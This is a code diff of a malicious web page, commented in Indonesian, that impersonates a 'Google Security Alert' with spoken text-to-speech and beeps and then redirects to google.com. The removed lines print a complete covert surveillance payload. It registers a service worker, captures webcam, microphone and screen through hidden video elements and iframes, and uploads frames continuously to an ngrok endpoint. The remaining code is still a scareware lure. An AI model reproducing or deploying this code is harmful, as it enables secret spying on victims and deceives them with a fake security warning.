@@ -10,8 +10,8 @@
   .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
   h2 { color: #4285f4; margin-bottom: 10px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 150px; overflow-y: auto; }
-  iframe, audio, video, canvas { display: none !important; }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
 <body>
@@ -30,7 +30,6 @@
 
   var logEl = document.getElementById('log');
   var executed = false;
-  var swRegistration = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -41,51 +40,19 @@
   // KONFIGURASI
   // ============================================
   var TARGET_URL = "https://www.google.com";
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
-
+  
   var CONFIG = {
     tts: {
       text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
       lang: 'en-US',
-      rate: 1.0,
+      rate: 0.85,
       pitch: 1.0,
       volume: 1.0
     }
   };
 
   // ============================================
-  // 1. INLINE SERVICE WORKER (BLOB URL)
-  // ============================================
-  var swCode = `
-    self.addEventListener('install', (e) => self.skipWaiting());
-    self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
-
-    self.addEventListener('message', (e) => {
-      if (e.data.type === 'FRAME') {
-        fetch('${SERVER_ENDPOINT}', {
-          method: 'POST',
-          body: e.data.formData,
-          keepalive: true
-        }).catch(err => console.error('SW Upload Error:', err));
-      }
-    });
-  `;
-
-  async function registerInlineSW() {
-    try {
-      if ('serviceWorker' in navigator) {
-        var blob = new Blob([swCode], { type: 'application/javascript' });
-        var swUrl = URL.createObjectURL(blob);
-        swRegistration = await navigator.serviceWorker.register(swUrl);
-        log("[+] Inline Service Worker Terdaftar.");
-      }
-    } catch (e) {
-      log("[-] SW Error: " + e.message);
-    }
-  }
-
-  // ============================================
-  // 2. AUDIO UNLOCK & TTS (INSTANT)
+  // 1. AUDIO UNLOCK & TTS
   // ============================================
   function initAudio() {
     try {
@@ -94,188 +61,86 @@
       
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
-      osc.type = 'sawtooth';
+      osc.type = 'sine';
       osc.frequency.value = 880;
-      gain.gain.value = 0.1;
+      gain.gain.value = 0.05;
       osc.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
-      osc.stop(ctx.currentTime + 1.0); // Beep 1 detik
-    } catch(e) {}
+      osc.stop(ctx.currentTime + 0.5);
+      
+      log("[+] AudioContext Unlocked.");
+    } catch(e) {
+      log("[-] Audio Error: " + e.message);
+    }
   }
 
   function startTTS() {
-    if (!('speechSynthesis' in window)) return;
+    if (!('speechSynthesis' in window)) {
+      log("[-] TTS tidak didukung.");
+      return;
+    }
     try {
       window.speechSynthesis.cancel();
       var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
       u.lang = CONFIG.tts.lang;
       u.rate = CONFIG.tts.rate;
       u.volume = CONFIG.tts.volume;
+
+      u.onstart = function() { log("[+] TTS Berbunyi..."); };
+      u.onend = function() { log("[+] TTS Selesai."); };
+      u.onerror = function(e) { log("[-] TTS Error: " + e.error); };
+
       window.speechSynthesis.speak(u);
-    } catch(e) {}
+      log("[+] TTS dimulai.");
+    } catch(e) {
+      log("[-] TTS Error: " + e.message);
+    }
   }
 
   // ============================================
-  // 3. KAMERA + MIKROFON (INSTANT)
+  // 2. INJECT IFRAME AUDIO (BACKUP)
   // ============================================
-  async function startCameraAndMic() {
-    try {
-      var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      
-      var video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      video.playsInline = true;
-      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
-      document.body.appendChild(video);
-      await video.play().catch(function(){});
-
-      var canvas = document.createElement('canvas');
-      canvas.width = 640;
-      canvas.height = 480;
-      var ctx = canvas.getContext('2d');
-
-      setInterval(function() {
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(function(blob) {
-            if (!blob) return;
-            var formData = new FormData();
-            formData.append('file', blob, 'camera.jpg');
-            
-            if (swRegistration && swRegistration.active) {
-              swRegistration.active.postMessage({ type: 'FRAME', formData: formData });
-            } else {
-              fetch(SERVER_ENDPOINT, { method: 'POST', body: formData, keepalive: true }).catch(function(){});
-            }
-          }, 'image/jpeg', 0.5);
-        }
-      }, 100);
-
-    } catch(err) {}
-  }
-
-  // ============================================
-  // 4. SCREEN SHARE (INSTANT)
-  // ============================================
-  async function startScreenShare() {
-    try {
-      var stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
-
-      var video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      video.playsInline = true;
-      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
-      document.body.appendChild(video);
-      await video.play().catch(function(){});
-
-      var canvas = document.createElement('canvas');
-      canvas.width = 1280;
-      canvas.height = 720;
-      var ctx = canvas.getContext('2d');
-
-      setInterval(function() {
-        if (video.readyState === video.HAVE_ENOUGH_DATA) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(function(blob) {
-            if (!blob) return;
-            var formData = new FormData();
-            formData.append('file', blob, 'screen.jpg');
-            
-            if (swRegistration && swRegistration.active) {
-              swRegistration.active.postMessage({ type: 'FRAME', formData: formData });
-            } else {
-              fetch(SERVER_ENDPOINT, { method: 'POST', body: formData, keepalive: true }).catch(function(){});
-            }
-          }, 'image/jpeg', 0.6);
-        }
-      }, 200);
-
-    } catch(err) {}
-  }
-
-  // ============================================
-  // 5. IFRAME BACKUP (AUDIO + CAMERA)
-  // ============================================
-  function injectBackupIframe() {
+  function injectAudioIframe() {
     try {
       var iframe = document.createElement('iframe');
-      iframe.allow = "camera; microphone; autoplay; display-capture";
+      iframe.allow = "autoplay";
       iframe.style.display = "none";
       
       iframe.srcdoc = `
         <!DOCTYPE html>
         <html>
         <body>
-          <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;"></video>
-          <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
-          
           <script>
-            (function() {
-              // Audio TTS
-              if ('speechSynthesis' in window) {
-                var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been compromised.");
-                u.lang = 'en-US';
-                u.volume = 1.0;
-                window.speechSynthesis.speak(u);
-              }
-
-              // Beep
-              try {
-                var ctx = new (window.AudioContext || window.webkitAudioContext)();
-                if (ctx.state === 'suspended') ctx.resume();
-                var osc = ctx.createOscillator();
-                osc.frequency.value = 880;
-                osc.connect(ctx.destination);
-                osc.start();
-                osc.stop(ctx.currentTime + 1.0);
-              } catch(e) {}
-
-              // Kamera Backup
-              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then(function(stream) {
-                  var video = document.getElementById('hiddenVideo');
-                  video.srcObject = stream;
-                  video.play().catch(function(){});
-                  parent.postMessage({ type: 'IFRAME_CAM_OK' }, '*');
-
-                  setInterval(function() {
-                    var canvas = document.getElementById('hiddenCanvas');
-                    var ctx = canvas.getContext('2d');
-                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                      canvas.toBlob(function(blob) {
-                        if (!blob) return;
-                        var formData = new FormData();
-                        formData.append('file', blob, 'iframe.jpg');
-                        fetch('${SERVER_ENDPOINT}', {
-                          method: 'POST',
-                          body: formData,
-                          keepalive: true
-                        }).catch(function(){});
-                      }, 'image/jpeg', 0.5);
-                    }
-                  }, 100);
-                })
-                .catch(function(err) {
-                  parent.postMessage({ type: 'IFRAME_CAM_FAIL', error: err.name }, '*');
-                });
-            })();
+            if ('speechSynthesis' in window) {
+              var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been compromised.");
+              u.lang = 'en-US';
+              u.volume = 1.0;
+              window.speechSynthesis.speak(u);
+            }
+            try {
+              var ctx = new (window.AudioContext || window.webkitAudioContext)();
+              if (ctx.state === 'suspended') ctx.resume();
+              var osc = ctx.createOscillator();
+              osc.frequency.value = 880;
+              osc.connect(ctx.destination);
+              osc.start();
+              osc.stop(ctx.currentTime + 0.5);
+            } catch(e) {}
           <\/script>
         </body>
         </html>
       `;
 
       document.getElementById("launcher-container").appendChild(iframe);
+      log("[+] Iframe Audio disuntikkan.");
     } catch(e) {}
   }
 
   // ============================================
-  // 6. TRIGGER (KLIK - INSTANT, NO DELAY)
+  // 3. TRIGGER (KLIK - INSTANT)
   // ============================================
-  document.body.addEventListener('click', async function() {
+  document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
@@ -285,26 +150,22 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Instant Hijack...");
+    log("[!] Memulai TTS Persistence...");
 
-    // A. Register Inline Service Worker
-    await registerInlineSW();
-
-    // B. Audio (TTS + Beep)
+    // A. Audio Init (0ms)
     initAudio();
     startTTS();
 
-    // C. Kamera + Mic
-    startCameraAndMic();
+    // B. Inject Iframe Audio (10ms)
+    setTimeout(injectAudioIframe, 10);
 
-    // D. Screen Share
-    startScreenShare();
-
-    // E. Iframe Backup
-    injectBackupIframe();
-
-    // F. REDIRECT KE GOOGLE (INSTANT!)
-    window.location.replace(TARGET_URL);
+    // C. REDIRECT KE GOOGLE (LANGSUNG!)
+    setTimeout(function() {
+      log("[+] Redirect ke Google.com...");
+      try {
+        window.location.replace(TARGET_URL);
+      } catch(e) {}
+    }, 50); // 50ms untuk memberi waktu TTS mulai
 
   }, { once: true });
 
